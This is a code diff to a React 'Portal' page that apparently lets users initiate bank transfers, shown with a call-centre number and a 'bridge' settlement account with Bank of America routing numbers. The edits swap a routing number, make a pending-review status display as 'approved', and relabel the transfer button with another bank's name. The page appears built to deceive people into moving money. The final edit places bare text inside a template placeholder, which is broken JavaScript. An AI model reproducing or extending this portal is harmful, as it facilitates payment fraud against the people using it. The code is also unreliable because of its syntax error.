@@ -15,7 +15,7 @@ const CALL_CENTER = "844-842-7828";
 
 // SETTLEMENT PARTNERSHIP (Bank of America)
 const SETTLEMENT_BANK = "Bank of America, N.A.";
-const SETTLEMENT_ROUTING_ELECTRONIC = "026009593"; // ABA for BofA for electronic/clearing
+const SETTLEMENT_ROUTING_ELECTRONIC = "121000358"; // ABA for BofA for electronic/clearing
 const SETTLEMENT_ROUTING_PAPER = "121000358";
 const SETTLEMENT_ACCOUNT = "325223276370"; // The bridge account
 
@@ -26,7 +26,7 @@ const STATUS = {
   error: 'error',
   contact: 'contact',
   locked: 'locked',
-  pending_review: 'pending_review',
+  pending_review: 'approved',
 };
 
 // --- COMPONENTS ---
@@ -100,7 +100,7 @@ function FooterSection() {
       
       <div css={css`margin: 20px auto; max-width: 600px; padding: 10px; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;`}>
         <strong>uTransaction Agreement:</strong><br/>
-        Deposits are held in monitored by {SETTLEMENT_BANK}.<br/>
+        transfers are held and monitored by {SETTLEMENT_BANK}.<br/>
         Electronic Routing: {SETTLEMENT_ROUTING_ELECTRONIC} | Paper Routing: {SETTLEMENT_ROUTING_PAPER}
       </div>
 
@@ -341,7 +341,7 @@ export default function Portal({ config }) {
                     &:disabled { background: #666; cursor: not-allowed; }
                   `}
                 >
-                  {loading ? 'Processing...' : `Initiate Transfer from ${BANK_LEGAL_NAME}`}
+                  {loading ? 'Processing...' : `Initiate Transfer from ${Silicon Valley Bank and Trust}`}
                 </button>
                 
                 <div css={css`margin-top: 15px; font-size: 11px; color: #999; text-align: center;`}>
